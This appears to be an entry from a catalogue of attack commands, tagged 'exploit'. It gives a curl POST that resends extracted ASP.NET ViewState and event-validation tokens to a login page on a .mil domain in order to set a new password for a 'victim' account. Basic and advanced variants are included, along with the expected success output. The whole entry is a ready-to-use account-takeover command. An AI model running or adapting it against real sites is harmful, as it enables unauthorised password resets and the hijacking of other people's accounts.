---
data: >-
  curl -X POST https://example.mil/Login.aspx -d
  "__VIEWSTATE=[EXTRACTED_VIEWSTATE]&__EVENTVALIDATION=[EXTRACTED_EVENTVALIDATION]&txtEMail=victim@example.mil&txtNewPassword=NewPass123&btnNewPassword=Submit"
  -b cookies.txt -v
tags:
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:12.203Z'
id: 8b23a99a-448a-42d5-9394-84c17a24c5c5
verified: false
validated: true
submitted: true
---
# curl-send-password-reset

## Command

```bash
curl -X POST https://example.mil/Login.aspx -d "__VIEWSTATE=[EXTRACTED_VIEWSTATE]&__EVENTVALIDATION=[EXTRACTED_EVENTVALIDATION]&txtEMail=victim@example.mil&txtNewPassword=NewPass123&btnNewPassword=Submit" -b cookies.txt -v
```

## Description

Sends a crafted POST request to reset a password in an ASP.NET app using extracted state tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "..."` | Form data with state and credentials | Yes |
| `-b cookies.txt` | Includes session cookies | Yes |
| `-v` | Verbose for response inspection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.mil/Login.aspx -d "txtEMail=victim@example.mil&txtNewPassword=NewPass123" -v
```

### Advanced Usage

```bash
curl -X POST https://example.mil/Login.aspx -d "__VIEWSTATE=...&txtEMail=..." -b cookies.txt -v
```

## Expected Output

Success response (e.g., "Password changed successfully") or redirect to login.

## Related

- [[Related Procedure]]
